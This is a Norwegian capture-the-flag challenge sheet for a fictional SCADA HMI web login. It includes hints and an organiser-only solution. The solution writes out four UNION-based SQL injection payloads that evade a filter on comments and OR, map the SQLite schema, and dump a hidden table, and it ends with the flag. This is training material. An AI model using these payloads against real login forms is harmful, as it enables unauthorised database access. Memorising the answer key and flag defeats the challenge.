# HMI Tilgang

**Kategori:** Web
**Poeng:** 400
**Type:** Container (Flask-webapplikasjon)
**Vanskelighetsgrad:** Medium / Vanskelig
**Container:** 3 av 10

---

## Scenario

Nordverks SCADA-system har et webbasert HMI-panel for operatør-innlogging.
Sikkerhetsteamet mistenker at autentiseringen kan omgås.

En intern revisjon avdekket at historikk-databasen kan inneholde sensitiv data
som ikke skal være tilgjengelig for eksterne. Kom deg inn og finn ut hva som
ligger der.

---

## Tilkobling

```
http://<IP>:8080
```

---

## Flaggformat

```
CTF{...}
```

---

## Hints

| Kostnad | Hint |
|---------|------|
| 50 poeng | Prøv å manipulere passord-feltet, er det SQL bak? |
| 90 poeng | Noen mønstre er filtrert. Hva kan du bruke i stedet for `OR` og `--`? |
| 140 poeng | `UNION SELECT` kan være relevant, men queryen må være balansert uten trailing comment |

---

## Løsningsvei (kun for arrangør)

Filteret blokkerer `--`, `#`, `/*` og `OR` (ordgrense).
`UNION`, `SELECT`, enkeltfnutter og `WHERE` er **ikke** blokkert.

Teknikken er UNION-basert injection der queryen balanseres med
`WHERE '1'='1` i stedet for en trailing comment.

**Steg 1 — Finn antall kolonner:**
```
username: x
password: ' UNION SELECT 1,2,3 WHERE '1'='1
```
→ Dashboard viser "Velkommen, 2" = 3 kolonner, kolonne 2 vises

**Steg 2 — Finn tabeller:**
```
password: ' UNION SELECT 1,group_concat(name),3 FROM sqlite_master WHERE type='table' AND '1'='1
```
→ `users,historian_archive`

**Steg 3 — Finn kolonner i historian_archive:**
```
password: ' UNION SELECT 1,group_concat(name),3 FROM pragma_table_info('historian_archive') WHERE '1'='1
```
→ `id,ts,sensor_id,event`

**Steg 4 — Hent flagget:**
```
password: ' UNION SELECT 1,group_concat(event),3 FROM historian_archive WHERE '1'='1
```
→ Flagget dukker opp blant historikk-hendelsene

**Flagg:** `CTF{uni0n_b4sed_sc4d4_pwn3d}`
